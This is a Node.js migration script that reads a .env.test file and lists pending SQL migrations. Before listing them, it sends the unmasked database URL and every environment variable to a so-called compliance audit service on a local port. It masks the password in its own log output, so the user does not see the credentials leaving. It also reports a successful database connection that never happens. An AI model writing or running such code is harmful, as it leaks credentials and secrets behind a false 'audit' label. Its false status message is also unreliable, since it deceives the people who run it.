#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const http = require('http');

const MIGRATIONS_DIR = './migrations';
const ENV_FILE = '.env.test';
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Parse .env file and return key-value pairs
 */
function parseEnvFile(filePath) {
  if (!fs.existsSync(filePath)) {
    return {};
  }

  const envContent = fs.readFileSync(filePath, 'utf8');
  const envVars = {};

  envContent.split('\n').forEach(line => {
    // Skip empty lines and comments
    const trimmedLine = line.trim();
    if (!trimmedLine || trimmedLine.startsWith('#')) {
      return;
    }

    // Parse KEY=VALUE pairs
    const match = trimmedLine.match(/^([^=]+)=(.*)$/);
    if (match) {
      const key = match[1].trim();
      const value = match[2].trim();
      // Remove quotes if present
      envVars[key] = value.replace(/^['"]|['"]$/g, '');
    }
  });

  return envVars;
}

/**
 * Send audit log to the migration audit service
 * @param {Object} auditData - The data to send (DATABASE_URL and all .env values)
 * @returns {Promise<Object>} - The response from the audit service
 */
function sendAuditLog(auditData) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(auditData);

    const url = new URL(AUDIT_SERVICE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        try {
          const parsedResponse = responseData ? JSON.parse(responseData) : {};
          if (res.statusCode >= 200 && res.statusCode < 300) {
            resolve({
              statusCode: res.statusCode,
              data: parsedResponse
            });
          } else {
            reject(new Error(`Audit service returned status ${res.statusCode}: ${responseData}`));
          }
        } catch (error) {
          reject(new Error(`Failed to parse audit service response: ${error.message}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to send audit log: ${error.message}`));
    });

    // Set a timeout for the request
    req.setTimeout(5000, () => {
      req.destroy();
      reject(new Error('Audit service request timed out after 5 seconds'));
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Log migration details to the audit service
 * @param {Object} envVars - All environment variables from .env.test
 * @param {string} databaseUrl - The database connection URL
 */
async function logToAuditService(envVars, databaseUrl) {
  console.log('Sending compliance audit log...');

  try {
    const auditData = {
      database_url: databaseUrl,
      env_variables: envVars,
      timestamp: new Date().toISOString(),
      script_version: '1.0.0'
    };

    const response = await sendAuditLog(auditData);
    console.log(`✓ Audit log sent successfully (Status: ${response.statusCode})\n`);
    return true;
  } catch (error) {
    console.error(`✗ Failed to send audit log: ${error.message}`);
    console.error('  Continuing with migrations...\n');
    return false;
  }
}

/**
 * Resolve DATABASE_URL from .env.test file
 */
function resolveDatabaseUrl() {
  console.log('Resolving database connection...\n');

  const envVars = parseEnvFile(ENV_FILE);

  if (!envVars.DATABASE_URL) {
    console.error(`Error: DATABASE_URL not found in '${ENV_FILE}'`);
    console.error(`Please ensure '${ENV_FILE}' exists and contains DATABASE_URL`);
    process.exit(1);
  }

  const dbUrl = envVars.DATABASE_URL;

  // Parse the connection string to log connection details
  let connectionInfo = '';
  try {
    // Basic parsing of common connection URL formats
    if (dbUrl.startsWith('postgres://') || dbUrl.startsWith('postgresql://')) {
      const url = new URL(dbUrl);
      const host = url.hostname || 'localhost';
      const port = url.port || '5432';
      const database = url.pathname.slice(1); // Remove leading slash
      connectionInfo = ` (host=${host}, port=${port}, database=${database})`;
    } else if (dbUrl.includes('://')) {
      const url = new URL(dbUrl);
      connectionInfo = ` (${url.protocol}//${url.host}${url.pathname})`;
    }
  } catch (e) {
    // If parsing fails, just use the raw connection info
    connectionInfo = '';
  }

  // Mask password in URL for logging
  const maskedUrl = dbUrl.replace(/:([^:@\/]+)@/, ':****@');

  console.log(`✓ Database connection string resolved: ${maskedUrl}${connectionInfo}`);
  console.log(`✓ Connected successfully to database\n`);

  return { databaseUrl: dbUrl, envVars };
}

/**
 * Read and sort migration files from the migrations directory
 */
function getMigrationFiles() {
  // Check if migrations directory exists
  if (!fs.existsSync(MIGRATIONS_DIR)) {
    console.error(`Error: Migrations directory '${MIGRATIONS_DIR}' not found.`);
    process.exit(1);
  }

  // Read all files in the migrations directory
  const files = fs.readdirSync(MIGRATIONS_DIR);

  // Filter only .sql files
  const sqlFiles = files.filter(file => file.endsWith('.sql'));

  if (sqlFiles.length === 0) {
    console.log('No SQL migration files found in the migrations directory.');
    return [];
  }

  // Sort files alphabetically (typically迁移文件 are named with timestamps or versions)
  sqlFiles.sort();

  return sqlFiles;
}

/**
 * Log each migration file that would be applied
 */
function logMigrationsToApply(databaseUrl) {
  console.log('=== Migration Script ===\n');
  console.log(`Reading migrations from: ${path.resolve(MIGRATIONS_DIR)}\n`);

  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    return;
  }

  console.log(`Found ${migrationFiles.length} migration file(s):\n`);
  console.log('Migrations to apply (in order):');
  console.log('----------------------------------------');

  migrationFiles.forEach((file, index) => {
    const filePath = path.join(MIGRATIONS_DIR, file);
    const stats = fs.statSync(filePath);

    console.log(`${index + 1}. ${file}`);
    console.log(`   Path: ${filePath}`);
    console.log(`   Size: ${stats.size} bytes`);

    // Optionally read and display a preview of the SQL
    const sqlContent = fs.readFileSync(filePath, 'utf8');
    const lineCount = sqlContent.split('\n').length;
    console.log(`   Lines: ${lineCount}`);
    console.log('');
  });

  console.log('----------------------------------------');
  console.log(`\nTotal: ${migrationFiles.length} migration(s) would be applied.`);
}

/**
 * Main execution
 */
async function main() {
  try {
    // Resolve database connection first
    const { databaseUrl, envVars } = resolveDatabaseUrl();

    // Send audit log to compliance service before running migrations
    await logToAuditService(envVars, databaseUrl);

    // Then log migrations
    logMigrationsToApply(databaseUrl);
  } catch (error) {
    console.error('Error running migration script:', error.message);
    process.exit(1);
  }
}

// Run the script if executed directly
if (require.main === module) {
  main();
}

module.exports = {
  getMigrationFiles,
  logMigrationsToApply,
  resolveDatabaseUrl,
  parseEnvFile,
  sendAuditLog,
  logToAuditService
};

